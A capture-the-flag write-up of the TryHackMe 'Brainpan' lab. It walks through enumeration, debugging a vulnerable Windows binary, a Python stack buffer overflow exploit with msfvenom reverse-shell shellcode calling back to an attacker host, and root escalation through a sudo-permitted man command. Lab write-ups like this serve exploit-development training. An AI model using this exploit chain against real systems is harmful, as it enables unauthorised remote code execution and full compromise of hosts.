# BrainPan

Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. 

# Initial Enumeration:

### NMAP

```
# nmap -Pn -sV -sC -O THM_TARGET
...
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
| _|                                                                 _|      
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|    
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|    _|  _|  _|   _|    _|  _|    _|  _|    _|  _|    _|  _|    _|    _|  
| _|_|_|   _|  _|_|   _|_|_|   _|_|_|   _|_|_|   _|_|_|   _|  _|   _|    _|  
|
[________________________ WELCOME TO BRAINPAN _________________________]
                        ENTER THE PASSWORD
                                >>

10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=5/31%Time=6A1C692E%P=x86_64-pc-linux-gnu%r(NU
...
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
...
```
- OS scan no exact match but port 9999 seems to suggest x86_64 Linux
- Port 9999 abyss? likely a running process similar to earlier CTF running on 9999. Tested with netcat IP 9999 and sure enought the same screen appeared to ascii art from nmap requesting password.
- Port 10000 was a simpleHTTPServer accessible via web browser. Displaying web page "Are you practicing safe coding?", referencing 2011 as proved to be year of the hack suggesting old content.

### Gobuster 
A quick search of port 10000 showed one folder of interest and its contents accessible via browser.
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/openvpn-troubleshooting-2025-infra-upgrades]
└─$ gobuster dir -u http://10.49.167.39:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.167.39:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
bin                  (Status: 301) [Size: 0] [--> /bin/]
```
In Target_IP:10000/bin/ was visited in browser showing only a single exe file, brainpan.exe. 
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/BrainPan]
└─$ file brainpan.exe                     
brainpan.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 (stripped to external PDB), 5 sections
```
- PE32 executable
- It’s a Windows binary, 32‑bit, compiled for x86.
- Corresponds to Windows NT 4.0 era toolchains — extremely old.

### Test brainpan.exe

Loaded on a Windows 8 VM in immunity I used a python script to send 100,200, and 1000 Ascii character \x41 or A. Only when 1000 used did it crash the application. 

To determine the EIP next I used: 
- 'msf-pattern_create -l 1000' for unique pattern for password field.
- Then determined its position of EIP offset with msf-pattern_offset -q <EIP_Characters>

```
└─$ msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3A...
...

# Then simply enter string created into password field and view EIP value in Immunity Debugger.
└─$ nc Target_IP 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Aa0Aa1Aa2A...
...
# After obtaining EIP value determine the offset required before the EIP field.

└─$ msf-pattern_offset -q 35724134
[*] Exact match at offset 524                                         
```
With the offset confirmed, the next step is validating bad characters that could corrupt the payload.
I sent a test payload consisting of:
- padding up to the EIP offset,
- BBBB (0x42424242) to confirm EIP control,
- followed by a full bad‑char sequence from \x01 through \xff placed immediately after ESP.
  
In the debugger, all bytes appeared intact except \x00, so the only bad character is \x00.
- With bad chars confirmed, I used Mona to enumerate modules and locate a suitable JMP ESP gadget in a module without ASLR, SafeSEH, or rebase.

The best candidate was found at:
- 0x311712F3 in brainpan.exe (found with mona command below, two alternatives mona options at end of this write up)
```
!mona find -s "\xff\xe4" -m brainpan.exe
```
- This address contains the bytes FF E4 (JMP ESP) and is safe to use.
- This value will replace 42424242 in EIP (written in little‑endian as \xF3\x12\x17\x31) so execution flow jumps directly into the buffer at ESP, where the NOP sled and shellcode will be placed.

```
# mona.py output

| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                       |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------------- |
...
| 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False | False    | False  | -1.0- [brainpan.exe] (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe) 0x0 |
...
| 0x75500000 | 0x7550a000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540                     |
...
----------

## Results

0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe), 0x0
```
### Corrected Logic for the Shellcode Decision (Brainpan)
With the offset, bad chars, and JMP ESP gadget confirmed, the next step was generating shellcode.
- The Brainpan binary itself is a Windows PE32 executable, which initially suggested using a Windows payload.
- However, the service running on port 9999 behaved like a Linux process, and Nmap OS detection was inconclusive.

After gaining limited access, the directory structure starting with /home/puck/ was a clear indicator of linux, the presence of checksrv.sh (a Bash script) and the fact that the Windows binary was being executed under Wine made the environment clear: The host OS is Linux, the Windows binary is running via Wine. Because Wine executes Windows binaries inside a Linux process, the payload must match the host OS architecture, not the PE file format.

- Therefore, using a Windows payload (windows/shell_reverse_tcp) was incorrect.
- The correct payload is a Linux x86 reverse shell, avoiding only \x00:
```
msfvenom -p linuxs/x86/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
```
Then implement the combined python code: 
```
import socket
import sys

padding = b'A' * 524  
EIP = b"\xf3\x12\x17\x31"
nop = b"\x90"  * 16
shellcode = (b"\xda\xd3\xb8\xa1\x9f\xcf\xe3\xd9\x74\x24\xf4\x5b\x2b\xc9"
...
b"\xb5")

try: 
	print("Sending payload:...")
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('Target_IP',9999))
	s.send(padding + EIP + nop + shellcode + b'\r\n')
	s.close()

except:
	print("Cannot connect to the server")
	sys.exit()
```
### Reverse shell success
```
└─$ rlwrap nc -lnvp 7777                 
listening on [any] 7777 ...
connect to [Attacker_IP] from (UNKNOWN) [Target_IP] 42772
CMD Version 1.4.1

Z:\home\puck>whoami
File not found.

Z:\home\puck>echo %USERNAME%
puck

Z:\home\puck>ver

CMD Version 1.4.1

Z:\home\puck>tasklist
File not found.

Z:\home\puck>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\puck
...
  3/6/2013   3:23 PM           513  checksrv.sh
  3/4/2013   2:45 PM  <DIR>         web
...

# 2 thingds of interest:
#      - web directory that held same web page content shown in browser on port 10000
#      - checksrv.sh, to keep winserver and simpleHTTPServer running

Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 
```
Realised as soon as /home/ at start of directory structure I needed to replace the shellcode with linux alternative, so here is another attempt with better suited and less limited shell.
```
└─$ rlwrap nc -lnvp 7777                 
listening on [any] 7777 ...
connect to [Attacker_IP] from (UNKNOWN) [Target_IP] 34456
whoami
puck
ps
  PID TTY          TIME CMD
  883 ?        00:00:00 sh
  884 ?        00:00:00 checksrv.sh
  896 ?        00:00:00 python
  998 ?        00:00:00 sh
 1056 ?        00:00:00 brainpan.exe
 1060 ?        00:00:00 wineserver
 1066 ?        00:00:00 services.exe
 1070 ?        00:00:00 winedevice.exe
 1080 ?        00:00:00 plugplay.exe
 1088 ?        00:00:00 ps
```

# Gained a better shell experience with
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z                                                                                             
stty raw -echo;fg                                 
reset              <--- reset leads to terminal type question

reset: unknown terminal type unknown
Terminal type? 
xterm              <--- type exterm as response

#back in shell next set export variables
export TERM=xterm
export SHELL=bash

```
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util

sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
Network option is ifconfig, proclist is TOP and manual is man command. GTFObins shows that only man and top has an interactive shell. Man command GTFObins suggestion shows an unprivileged, sudo or suid option all using: 
```
man '-H/bin/sh #' man
```
Because this system’s man does NOT support the -H HTML‑browser escape, so the GTFOBins trick is not applicable on this machine. Another alternative that works here is use:
/home/anansi/bin/anasi_util manual man 
then enter to get root shell:
!bash

then check whoami shows root.

```
root@brainpan:/usr/share/man# whoami
whoami
root
```

TOP commmand option won't work as it requires procps-ng (top version), which is not present.

### 2 Alternat Mona Commands 
1. !mona bytearray -b "\x00"
Purpose:  
Generate a full test bytearray (\x01 → \xff) excluding known bad chars. This made more sense than re-using a file that I copied them previously fromm, it offers ready to use python code containing all bad char.

2. !mona compare -f C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a ESP
Purpose:  
Compare the bytearray you sent with what appears in memory at the address you specify (usually ESP).

Why:
Quicker than copying bytearray.md python in to a seperate python script to run through ESP.
This identifies which bytes are corrupted by the program.
Results questionable tests showed only 1 unmodified out of 255 characters and then states /x01 as only possibly bad char.
```

[+] Comparing with memory at location : 0x0028eec8 (Stack)
Only 1 original bytes of 'normal' code found.
    ,-----------------------------------------------.
    | Comparison results:                           |
    |-----------------------------------------------|
  0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
    |00 00 4f 00 00 00 4f 00 00 00 00 00 00 00 4f 00| Memory
 10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
    |08 ef 28 00 5d 76 a0 77 01 00 00 00 00 00 4f 00| Memory
... Too repetive to include it all.
 40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
    |82 85 96 77 00 00 4f 00 95 ad 9a 77 f8 3b    00| Memory
 50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
    |02 00 04 06 b1 1a 96 77 54 00 04 50 38 00 00 00| Memory
...
 e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
    |40 9d 4f 00 48 9d 4f 00 e4 03 4f 00 00 00 04 04| Memory
 f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
    |00 00 4f 00 1c 00 00 00 50 01 00 00 18 73 1e   | Memory
    `-----------------------------------------------'

              | File      | Memory    | Note       
---------------------------------------------------
0  0  78  78  | 01 ... 4e | 00 ... 3b | corrupted  
78 78 1   1   | 4f        | 4f        | unmodified!
79 79 176 176 | 50 ... ff | 00 ... 1e | corrupted  

First mismatching byte: 01
Possibly bad chars: 01
Bytes omitted from input: 00
```
